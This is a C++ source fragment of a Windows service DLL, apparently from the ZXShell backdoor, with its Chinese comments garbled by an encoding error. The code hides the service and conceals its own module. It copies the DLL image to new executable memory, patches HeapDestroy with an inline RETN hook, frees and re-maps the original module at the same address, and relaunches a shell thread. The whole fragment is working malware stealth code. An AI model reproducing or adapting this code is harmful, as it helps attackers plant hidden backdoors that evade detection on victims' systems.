	HANDLE hThread = ZXSAPI::CreateThread(0,0,
		(LPTHREAD_START_ROUTINE)pAddr, lParam, 0, &dwID);

	CloseHandle(hThread);

}

DWORD WINAPI UnLoadLibrary(LPVOID lParam)
{
	SPAMFUNCTION 
		
	//__asm INT 3
//	DebufLog.Print("%s: UnLoadLibrary start", ServiceName);

	void *lpNewBaseOfDll = lParam;

	incLibraryCount((HMODULE)g_hDll);

	BOOL ret;
	BYTE inlineHookCode_bak[4];
	BYTE inlineHookCode[4] = "\xC2\x04\x00";//RETN 0004
	MODULEINFO modinfo;
	HMODULE prev_hDll = (HMODULE)g_hDll;
	char dllpath[MAX_PATH];

	strcpy(dllpath, g_DllPath);

	void *origin_ShellMainThread = ZXSAPI::GetProcAddress((HINSTANCE)g_hDll, "ShellMainThread");

	_ZXVirtualAlloc *_VirtualAlloc = ZXSAPI::VirtualAlloc;
	_ZXHeapDestroy *_HeapDestroy = (_ZXHeapDestroy *)ZXSAPI::GetProcAddress(GetModuleHandle("kernel32.dll"), "HeapDestroy");;
	ZXLoadLibrary _LoadLibrary = ZXSAPI::LoadLibrary;
	ZXCreateThread _CreateThread = ZXSAPI::CreateThread;

	if(origin_ShellMainThread == NULL 
		|| _HeapDestroy == NULL 
		|| _VirtualAlloc == NULL)
	{
//		DebufLog.Print("%s: Invalid point", ServiceName);
		createMainThread(origin_ShellMainThread, lpNewBaseOfDll);
		return 0;
	}

	_vc_memcpy *_memcpy = (_vc_memcpy *)ZXSAPI::GetProcAddress(GetModuleHandle("ntdll.dll"), "memcpy");

	__printf("0x%.8x, 0x%.8x, 0x%.8x, 0x%.8x\r\n", 
		_VirtualAlloc, 
		_HeapDestroy,
		_memcpy,
		_LoadLibrary);

	::GetModuleInformation(::GetCurrentProcess(), prev_hDll, &modinfo, sizeof(MODULEINFO));

	Sleep(1000);

	DWORD oldProtect;

	if(!ZXSAPI::VirtualProtect(_HeapDestroy, 3, PAGE_EXECUTE_READWRITE, &oldProtect))
	{
//		__printf("VirtualProtect()\r\n", GetLastError());
		createMainThread(origin_ShellMainThread, lpNewBaseOfDll);
		return 0;
	}

	_memcpy(inlineHookCode_bak, _HeapDestroy, 3);
	_memcpy(_HeapDestroy, inlineHookCode, 3);

	//ret = VirtualProtect(prev_hDll, modinfo.SizeOfImage,PAGE_READONLY,&oldProtect);

	ZXSAPI::FreeLibrary(prev_hDll);//!!!

	//ret = VirtualProtect(prev_hDll, modinfo.SizeOfImage,PAGE_EXECUTE_READWRITE,&oldProtect);

	_memcpy(_HeapDestroy, inlineHookCode_bak, 3);

	g_hDll = (HMODULE)_VirtualAlloc(prev_hDll,modinfo.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);

	if(g_hDll == NULL)
	{
//		DebufLog.Print("%s: _VirtualAlloc returned NULL, prev_hDll=0x%.8x", ServiceName, prev_hDll);

		//LoopUnLoadLibrary(lParam);
		//ʧ�ܣ�����ԭ��dll��������ģʽ

		g_hDll = _LoadLibrary(dllpath);

		origin_ShellMainThread = (void*)((DWORD)g_hDll + (DWORD)origin_ShellMainThread - (DWORD)prev_hDll);

		_CreateThread(0, 0, (LPTHREAD_START_ROUTINE)origin_ShellMainThread, lpNewBaseOfDll, 0, 0);
		return 0;
	}

	_memcpy(prev_hDll, lParam, modinfo.SizeOfImage);

	createMainThread(origin_ShellMainThread, lpNewBaseOfDll);

//	DebufLog.Print("%s: HideLibrary end", ServiceName);

	return 0;
}

/************************************

Function: HideLibrary

Description: 

  �ȸ�dll��һ���ڴ濽����Ȼ�����̵߳��ø��ڴ濽���е�UnLoadLibrary������ַ
  ���߳������FreeLibrary�ͷ�ԭ����dll�������������ԭ��ͬ����ַ���ڴ棬����ԭ����

History:    2007-6-14   LZX   Created

************************************/

BOOL HideLibrary()
{
	SPAMFUNCTION 
		

	//////////////////////////////
	MODULEINFO modinfo;
	DWORD oldProtect;

	::GetModuleInformation(::GetCurrentProcess(), (HMODULE)g_hDll, &modinfo, sizeof(MODULEINFO));

	void *lpNewBaseOfDll = ZXSAPI::VirtualAlloc(NULL, modinfo.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	//void *lpNewBaseOfDll = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, modinfo.SizeOfImage);

	if(lpNewBaseOfDll == NULL)
		return FALSE;

	memcpy(lpNewBaseOfDll, modinfo.lpBaseOfDll, modinfo.SizeOfImage);

	if(!ZXSAPI::VirtualProtect(lpNewBaseOfDll, modinfo.SizeOfImage, PAGE_EXECUTE_READWRITE, &oldProtect))
	{
		__printf("VirtualProtect()\r\n", GetLastError());
		//DebufLog.Print("%s: VirtualProtect()", ServiceName, GetLastError());
		return FALSE;
	}

	void *pFunc = LPVOID((DWORD)lpNewBaseOfDll + (DWORD)UnLoadLibrary - (DWORD)modinfo.lpBaseOfDll);

	HANDLE hThread = ZXSAPI::CreateThread(0,0,
		(LPTHREAD_START_ROUTINE)pFunc, (LPVOID)lpNewBaseOfDll, 0, NULL);

	if(hThread == NULL)
		return FALSE;

	CloseHandle(hThread);

	return TRUE;
}

BOOL WINAPI ShellMain()
{
	SPAMFUNCTION 
		
	return HideLibrary();

}

void __stdcall ServiceMain( int argc, wchar_t* argv[] )
{
	SPAMFUNCTION 
		
	__printf("ServiceMain Entry\r\n");

	wcstombs(ServiceName, argv[0], 50);
//
	hSrv = ZXSAPI::RegisterServiceCtrlHandler( ServiceName, (LPHANDLER_FUNCTION)ServiceHandler);
    if( hSrv == NULL )
		return;

    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0 );

	//
	//DebufLog.Print("ServiceMain, HideSvc, %s, 0x%.8x", ServiceName, g_hDll);
/**/
	SetupMode = HideSvc(ServiceName);//���ط���

	//DebufLog.Print("%s: HideSvc %d", ServiceName, SetupMode);

	//if(g_hDll == (HANDLE)0x52000000)
	{
		if(HideLibrary())//����ģ��
			return;

	}
	

	createMainThread(ShellMainThread, 0);
	//ShellMainThread(0);



/*
	DWORD dwID;
	HANDLE hThread = ZXSAPI::CreateThread(0,0,
		(LPTHREAD_START_ROUTINE)ShellMainThread, 0, 0, &dwID);
	HideSvc(ServiceName);
	WaitForSingleObject(hThread, -1);
	CloseHandle(hThread);

	TellSCM(SERVICE_STOP_PENDING, 0, 0 );
	TellSCM(SERVICE_STOPPED, 0, 0 );

	do{
		Sleep(10);
	}while(dwCurrState != SERVICE_STOP_PENDING && dwCurrState != SERVICE_STOPPED);
*/
    return;

}

